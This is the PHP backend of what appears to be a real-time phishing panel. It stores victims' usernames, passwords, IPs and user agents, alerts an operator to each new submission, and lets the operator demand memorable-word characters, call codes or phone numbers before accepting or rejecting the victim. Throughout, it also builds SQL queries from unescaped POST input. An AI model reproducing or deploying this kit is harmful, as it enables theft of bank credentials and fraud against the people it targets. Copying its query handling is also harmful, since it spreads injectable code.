<?php
include 'config.php';
include 'connect.php';



session_start();

function numeric($num){
	if (preg_match('/^[0-9]+$/', $num)) {
		$status = true;
	} else {
		$status = false;
	}
	return $status;
}

////////////////////////////////////// RESET THE BUZZ ON EACH SUBMITTED THING

if($_GET['type'] == 'login'){
	if($_POST['username'] and $_POST['password'] and $_POST['ip'] and $_POST['ua']){
		$username = $_POST['username'];
		$password = $_POST['password'];
		$ip = $_POST['ip'];
		$ua = urlencode($_POST['ua']);
		$uniqueid = time();
		
		if($_SESSION['started'] == 'true'){
			$uniqueid = $_SESSION['uniqueid'];
			$query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, user='$username', pass='$password', useragent='$ua', ip='$ip' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		}else{
			$_SESSION['uniqueid'] = $uniqueid;
			$_SESSION['started'] = 'true';
			$query = mysqli_query($conn, "INSERT INTO customers (user, pass , ip, useragent,uniqueid, status) VALUES ('$username', '$password', '$ip', '$ua',$uniqueid, 1)");
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}
	}
}












if($_SESSION['admin_logged'] == 'true'){
	if($_GET['type'] == 'commmand'){
		if($_POST['userid'] and numeric($_POST['userid']) == true and $_POST['status'] and numeric($_POST['status']) == true or ($_POST['1stchar'] and $_POST['2ndchar'] and $_POST['3rdchar']) or $_POST['callcode'] or $_POST['callnum']){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = $_POST['status'];
			
			
			
			$memo_1stchar = $_POST['1stchar'];		
			$memo_2ndchar = $_POST['2ndchar'];		
			$memo_3rdchar = $_POST['3rdchar'];		
			
			$callcode = $_POST['callcode'];
			
			$callnum = $_POST['callnum'];
			
			

			if($callcode != null and $callcode != '' and ($memo_1stchar == null or $memo_1stchar == '') and ($memo_2ndchar == null or $memo_2ndchar == '') and ($memo_3rdchar == null or $memo_3rdchar == '') and ($callnum == null or $callnum == '')){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, code='$callcode' WHERE id=$userid");
			}elseif($memo_1stchar != null and $memo_1stchar != '' and $memo_2ndchar != null and $memo_2ndchar != '' and $memo_3rdchar != null and $memo_3rdchar != '' and ($callcode == null or $callcode == '') and ($callnum == null or $callnum == '')){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, askchar1='$memo_1stchar',askchar2='$memo_2ndchar',askchar3='$memo_3rdchar' WHERE id=$userid");
			}elseif($callnum != null and $callnum != '' and ($memo_1stchar == null or $memo_1stchar == '') and ($memo_2ndchar == null or $memo_2ndchar == '') and ($memo_3rdchar == null or $memo_3rdchar == '') and ($callcode == null or $callcode == '')){
				$query = mysqli_query($conn, "UPDATE customers SET status=$status, phonenumber='$callnum' WHERE id=$userid");
			}else{
				$query = mysqli_query($conn, "UPDATE customers SET status=$status WHERE id=$userid");
			}
			
			if($query){

				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}else{
		echo json_encode(array(
			'status' => 'notokk'
		));
		}

		
		
	}


	if(isset($_GET['get_submitted'])){
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE (status=1 and buzzed=0) or (buzzed=0 and status=13)");
		if($query){
			$num = mysqli_num_rows($query);
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			if($num >= 1){
				
					echo json_encode(array(
						'status' => 'ok'
					));
				
				
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}		
		}else{
			echo json_encode(array(
				'status' => 'notok'
			));
		}
		
		
	}

	if(isset($_GET['buzzoff'])){
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status=1 OR status=13");
		if($query){
			$array = array_filter(mysqli_fetch_all($query,MYSQLI_ASSOC));	
			foreach($array as $value){
				$userid = $value['id'];
				$queryy = mysqli_query($conn, "UPDATE customers SET buzzed=1 WHERE id=$userid");
				if($queryy){
					$stat = 'ok';
				}else{
					$stat = 'notok';
				}
			}
			if($stat == 'ok'){
				echo json_encode(array(
				'status' => 'ok'
			));
			}else{
				echo json_encode(array(
				'status' => 'notok'
			));
			}
			
		}else{
			echo json_encode(array(
				'status' => 'notok'
			));
		}
		
		
	}
	
		if($_GET['type'] == 'delete'){
			if($_POST['userid'] and numeric($_POST['userid']) == true){
				$userid = $_POST['userid']; // the normal id not unique one
				
				$query = mysqli_query($conn, "DELETE FROM customers WHERE id=$userid");
				
				
				if($query){
					
					
					echo json_encode(array(
					'status' => 'ok'
					));
				}else{
					echo json_encode(array(
					'status' => 'notok'
					));
				}
			}else{
				echo json_encode(array(
					'status' => 'notokk'
				));
			}
		
		
	}
	
	
	if($_GET['type'] == 'submitted'){
		if($_POST['userid'] and numeric($_POST['userid']) == true){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = str_replace("_$userid","",$_POST['status']);

			if($status == 'accept'){
				$status = 11;
			}elseif($status == 'reject'){
				$status = 12;
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
			$query = mysqli_query($conn, "UPDATE customers SET status=$status WHERE id=$userid");
			
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
			
			}else{
					echo json_encode(array(
						'status' => 'notokk'
					));
			}
		
		
	}



}





if($_SESSION['started'] == 'true'){
	
	
	

	if($_GET['wait'] and numeric($_GET['wait']) == true){
		$id = $_GET['wait'];
		$query = mysqli_query($conn, "UPDATE customers SET status=0 WHERE uniqueid=$id");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
		
	
	

	if($_GET['getstatus'] and numeric($_GET['getstatus']) == true){
		$id = $_GET['getstatus'];
		$query = mysqli_query($conn, "SELECT * from customers WHERE uniqueid='$id'");
		
		if(mysqli_num_rows($query) >= 1){
			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			echo $array['status'];
		}		
		
	}




if($_GET['type'] == 'memo'){
	if($_POST['formMem1'] and $_POST['formMem2'] and $_POST['formMem3'] and  $_POST['userid'] and numeric($_POST['userid']) == true){
		$formMem1 = $_POST['formMem1'];
		$formMem2 = $_POST['formMem2'];
		$formMem3 = $_POST['formMem3'];
		
		$uniqueid = $_POST['userid']; // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET char1='$formMem1',char2='$formMem2',char3='$formMem3', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
}

if($_GET['type'] == 'call'){
	if($_POST['userid'] and numeric($_POST['userid']) == true){

		
		$uniqueid = $_POST['userid']; 
		$query = mysqli_query($conn, "UPDATE customers SET status=13, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			echo json_encode(array(
			'status' => 'ok'
			));
		}else{
			echo json_encode(array(
			'status' => 'notok'
			));
		}
	}
}






}